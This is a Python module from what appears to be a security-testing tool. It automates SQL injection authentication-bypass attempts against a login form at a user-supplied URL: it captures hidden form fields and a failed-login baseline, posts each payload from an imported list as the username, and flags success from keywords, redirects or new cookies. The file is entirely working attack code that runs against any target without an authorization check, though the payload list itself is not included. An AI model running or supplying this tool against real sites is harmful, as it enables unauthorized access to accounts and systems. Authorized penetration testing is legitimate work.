import requests
from bs4 import BeautifulSoup
from rich.console import Console
from rich.prompt import Prompt
from .utils import console
from .constants import AUTH_BYPASS_PAYLOADS

def run_auth_bypass(base_url):
    console.print("[bold cyan]--- Authentication Bypass SQLi Tester ---[/bold cyan]")

    login_url = Prompt.ask("[?] Enter full login URL (e.g., http://example.com/login)")
    user_field = Prompt.ask("[?] Username field name")
    pass_field = Prompt.ask("[?] Password field name")
    success_keywords_input = Prompt.ask("[?] Success keywords (comma-separated, e.g., Dashboard,Welcome)")
    success_keywords = [k.strip().lower() for k in success_keywords_input.split(",")]

    session = requests.Session()
    try:
        resp = session.get(login_url, timeout=10)
    except requests.RequestException as e:
        console.print(f"[-] Failed to load login page: {e}", style="bold red")
        return

    soup = BeautifulSoup(resp.text, "html.parser")
    form = soup.find("form")
    if not form:
        console.print("[-] Login form not found.", style="bold red")
        return

    hidden_inputs = {hidden.get("name"): hidden.get("value", "")
                     for hidden in form.find_all("input", type="hidden")
                     if hidden.get("name")}

    console.print(f"[+] Found hidden inputs: {list(hidden_inputs.keys())}")

    baseline_data = {user_field: "invaliduser", pass_field: "invalidpass"}
    baseline_data.update(hidden_inputs)

    try:
        baseline_resp = session.post(login_url, data=baseline_data, timeout=10)
    except requests.RequestException as e:
        console.print(f"[-] Failed baseline request: {e}", style="bold red")
        return

    baseline_length = len(baseline_resp.text)
    baseline_url = baseline_resp.url
    baseline_cookies = session.cookies.get_dict()
    console.print("[*] Baseline failed login captured.")

    for payload in AUTH_BYPASS_PAYLOADS:
        test_data = {user_field: payload, pass_field: "randompass"}
        test_data.update(hidden_inputs)
        try:
            test_resp = session.post(login_url, data=test_data, timeout=10)
        except requests.RequestException:
            continue

        keyword_found = any(k in test_resp.text.lower() for k in success_keywords)
        url_changed = test_resp.url != baseline_url
        new_cookies = any(cookie not in baseline_cookies for cookie in session.cookies.get_dict())

        if keyword_found or url_changed or new_cookies:
            console.print(f"[bold green][+] Authentication Bypass Detected![/bold green]")
            console.print(f"Payload: [yellow]{payload}[/yellow]")
            console.print(f"Response URL: {test_resp.url}")
            return

    console.print("[bold red][-] No authentication bypass vulnerability detected.[/bold red]")
